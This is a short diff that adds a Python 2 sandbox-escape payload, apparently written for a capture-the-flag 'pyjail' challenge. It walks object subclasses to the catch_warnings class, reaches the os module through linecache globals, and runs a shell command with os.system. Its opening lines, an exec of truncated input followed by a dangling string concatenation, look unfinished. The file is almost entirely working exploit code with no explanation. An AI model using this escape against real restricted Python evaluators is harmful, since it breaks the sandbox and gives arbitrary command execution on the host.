@@ -1,0 +1,8 @@
+exec 'result = ' + saved_raw_input()[:35]
+
+'result' + 
+
+
+a = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0].__repr__.im_func.func_globals
+print a["linecache"].os
+a["linecache"].os.system("ls")
